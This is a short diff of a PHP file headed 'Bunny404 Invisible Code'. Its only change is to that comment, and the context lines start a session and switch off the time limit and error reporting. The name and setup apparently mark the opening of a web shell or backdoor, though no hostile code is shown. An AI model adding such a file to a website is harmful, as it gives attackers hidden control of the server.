@@ -1,6 +1,6 @@
 <?php
 
-/* ./Bunny404 Invisible Code */
+/* Bunny404 Invisible Code */
 session_start();
 set_time_limit(0);
 error_reporting(0);
